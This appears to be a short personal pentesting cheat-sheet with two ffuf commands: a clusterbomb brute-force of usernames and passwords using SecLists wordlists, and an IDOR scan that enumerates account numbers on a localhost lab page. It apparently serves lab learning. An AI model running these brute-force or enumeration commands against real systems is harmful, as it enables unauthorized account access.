
## Brute force username and Password


```bash
ffuf -request tmp.txt -request-proto http -mode clusterbomb -w /usr/share/seclists/Passwords/pass5.txt:FUZZPASSWORD -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSERNAME -fs 3256
```

Learn more here: [[Jun 19, 2024]]

## IDOR account number scanning

```bash
ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w numbers.txt -mr 'admin'
```

Learn more here: [[Jun 20, 2024]]